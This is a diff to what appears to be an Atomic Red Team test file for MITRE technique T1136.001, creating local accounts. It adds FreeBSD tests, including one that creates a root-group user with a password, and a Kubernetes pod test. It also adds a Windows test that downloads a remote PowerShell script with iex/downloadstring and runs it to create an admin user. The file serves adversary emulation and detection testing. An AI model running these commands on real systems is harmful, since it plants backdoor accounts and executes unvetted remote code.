@@ -1,5 +1,5 @@
 attack_technique: T1136.001
-display_name: 'Create Account: Local Account'
+display_name: "Create Account: Local Account"
 atomic_tests:
 - name: Create a user account on a Linux system
   auto_generated_guid: 40d8eabd-e394-46f6-8785-b9bfa1d011d2
@@ -10,7 +10,7 @@ atomic_tests:
   input_arguments:
     username:
       description: Username of the user to create
-      type: String
+      type: string
       default: evil_user
   executor:
     command: |
@@ -18,6 +18,24 @@ atomic_tests:
     cleanup_command: |
       userdel #{username}
     name: bash
+    elevation_required: true
+- name: Create a user account on a FreeBSD system
+  auto_generated_guid: a39ee1bc-b8c1-4331-8e5f-1859eb408518
+  description: |
+    Create a user via pw
+  supported_platforms:
+  - linux
+  input_arguments:
+    username:
+      description: Username of the user to create
+      type: string
+      default: evil_user
+  executor:
+    command: |
+      pw useradd #{username} -s /usr/sbin/nologin -d /nonexistent -c evil_account
+    cleanup_command: |
+      rmuser -y #{username}
+    name: sh
     elevation_required: true
 - name: Create a user account on a MacOS system
   auto_generated_guid: 01993ba5-1da3-4e15-a719-b690d4f0f0b2
@@ -28,11 +46,11 @@ atomic_tests:
   input_arguments:
     username:
       description: Username of the user to create
-      type: String
+      type: string
       default: evil_user
     realname:
       description: "'realname' to record when creating the user"
-      type: String
+      type: string
       default: Evil Account
   executor:
     command: |
@@ -56,11 +74,11 @@ atomic_tests:
   input_arguments:
     username:
       description: Username of the user to create
-      type: String
+      type: string
       default: T1136.001_CMD
     password:
       description: Password of the user to create
-      type: String
+      type: string
       default: T1136.001_CMD!
   executor:
     command: |
@@ -79,7 +97,7 @@ atomic_tests:
   input_arguments:
     username:
       description: Username of the user to create
-      type: String
+      type: string
       default: T1136.001_PowerShell
   executor:
     command: |
@@ -97,11 +115,11 @@ atomic_tests:
   input_arguments:
     username:
       description: Username of the user to create
-      type: String
+      type: string
       default: butter
     password:
       description: Password of the user to create
-      type: String
+      type: string
       default: BetterWithButter
   executor:
     command: |
@@ -110,6 +128,29 @@ atomic_tests:
     cleanup_command: |
       userdel #{username}
     name: bash
+    elevation_required: true
+- name: Create a new user in FreeBSD with `root` GID.
+  auto_generated_guid: d141afeb-d2bc-4934-8dd5-b7dba0f9f67a
+  description: |
+    Creates a new user in FreeBSD and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.
+  supported_platforms:
+  - linux
+  input_arguments:
+    username:
+      description: Username of the user to create
+      type: string
+      default: butter
+    password:
+      description: Password of the user to create
+      type: string
+      default: BetterWithButter
+  executor:
+    command: |
+      pw useradd #{username} -g 0 -d /root -s /bin/sh
+      echo "#{password}" | pw usermod #{username} -h 0
+    cleanup_command: |
+      pw userdel #{username}
+    name: sh
     elevation_required: true
 - name: Create a new Windows admin user
   auto_generated_guid: fda74566-a604-4581-a4cc-fbbe21d66559
@@ -120,11 +161,11 @@ atomic_tests:
   input_arguments:
     username:
       description: Username of the user to create
-      type: String
+      type: string
       default: T1136.001_Admin
     password:
       description: Password of the user to create
-      type: String
+      type: string
       default: T1136_pass
   executor:
     command: |
@@ -134,3 +175,44 @@ atomic_tests:
       net user /del "#{username}" >nul 2>&1
     name: command_prompt
     elevation_required: true
+- name: Create a new Windows admin user via .NET
+  auto_generated_guid: 2170d9b5-bacd-4819-a952-da76dae0815f
+  description: |
+    Creates a new admin user in a powershell session without using net.exe
+  supported_platforms:
+  - windows
+  executor:
+    command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')
+    name: powershell
+    elevation_required: true
+- name: Create a Linux user via kubectl in a Pod
+  auto_generated_guid: d9efa6c7-6518-42b2-809a-4f2a8e242b9b
+  description: |
+    Launches a short-lived Alpine pod and creates a Linux user inside the pod.
+    The pod is automatically deleted after execution.
+  supported_platforms:
+  - containers
+  input_arguments:
+    pod_name:
+      description: K8s pod_name to execute the command in
+      type: string
+      default: atomic-linux-useradd
+    username:
+      description: Username of the user to create inside the pod
+      type: string
+      default: evil_user
+    image_name:
+      description: Name of the docker image
+      type: string
+      default: alpine
+  dependencies:
+  - description: kubectl must be installed and configured
+    get_prereq_command: |
+      echo "kubectl must be installed manually"
+    prereq_command: |
+      which kubectl
+  executor:
+    name: bash
+    elevation_required: false
+    command: |
+      kubectl run #{pod_name} --image=#{image_name} --restart=Never --rm -it -- sh -lc 'adduser -D #{username} && id #{username}'
